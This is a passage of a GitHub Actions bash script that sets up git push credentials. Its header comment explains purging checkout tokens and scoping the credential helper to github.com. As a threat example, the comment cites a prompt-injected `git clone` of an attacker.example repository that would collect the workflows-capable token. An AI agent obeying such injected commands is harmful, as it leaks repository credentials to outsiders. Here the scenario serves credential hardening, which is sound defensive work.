# (github-actions[bot]). gh-63: bot-actor pushes put every machine PR behind
# the "workflows awaiting approval" gate and cannot touch .github/workflows.
#
# Shared by EVERY push path in a run (the "Configure Git Author + push
# credentials" step and the memory-persist re-assert) so the logic exists
# exactly once (review: the inline copies drifted / had to be fixed 6x).
# Idempotent — safe to call again later in the same job.
#
# Callers must export SOURCE_GITHUB_TOKEN; GITHUB_WORKSPACE
# come from the Actions environment (sane fallbacks below).
#
# What it does, in order:
#   1. Purge the checkout's persisted App token:
#        - actions/checkout (verified against the shipped v4.2.2 and v5.0.0
#          dist) writes http.https://github.com/.extraheader DIRECTLY into
#          the repo's local .git/config (configureToken → local config,
#          globalConfig = false). It never writes any RUNNER_TEMP include
#          file — an earlier version of this script claimed so and removed
#          a matching temp-file glob, a silent no-op that chased a file
#          that does not exist (PR #68 review thread 7). `git config
#          --unset-all` on the local config is what actually purges the
#          main repo.
#        - with submodules: true, checkout ALSO writes the real token
#          extraheader into EACH submodule's local config
#          (.git/modules/<name>/config) — a `git submodule foreach
#          --recursive` purge follows, or any push from inside agents/
#          still authenticates as github-actions[bot] (thread 8).
#        - belt-and-braces: the global config too (older checkout versions
#          persisted the extraheader globally).
#   2. Install the credential that must win, HOST-SCOPED to github.com:
#        a generic `credential.helper` is consulted for ANY https host whose
#        server answers 401 — a prompt-injected `git clone
#        https://attacker.example/repo.git` would receive the
#        workflows-capable PAT. The helper is therefore registered on
#        `credential.https://github.com.helper` (only consulted for matching
#        URLs) and ALSO re-checks the host from its stdin before answering.
#        Both inherited helper lists (generic + github.com-scoped) are reset
#        first, so this checkout is immune to anything that adds helpers
#        later (e.g. a mid-run `gh auth setup-git`, runner-image config).
#        Each invocation is logged to .dmtools/credential-helper.log with a
#        CRED_HELPER_CONTEXT tag — the at-push-time proof of which
#        credential served the push (trace dry-runs tag themselves
#        `trace-dry-run` so they cannot inflate the push evidence).
#   3. Best-effort: attribute commits to the SOURCE account (its noreply
#      email). The PUSH actor is what matters for the approval gate; dm.ai
#      stays the fallback when the lookup fails.
set -euo pipefail

# Fallback commit identity — overridden below when the SOURCE account resolves.
git config --global user.name "dm.ai"
git config --global user.email "dm.ai@epam.com"

if [ -z "${SOURCE_GITHUB_TOKEN:-}" ]; then
  echo "::warning::SOURCE_GITHUB_TOKEN not set — no push credential installed. The checkout no longer persists its App token (persist-credentials: false, gh-63), so pushes FAIL instead of silently authenticating as github-actions[bot] and landing behind the bot-actor approval gate"
  exit 0
fi
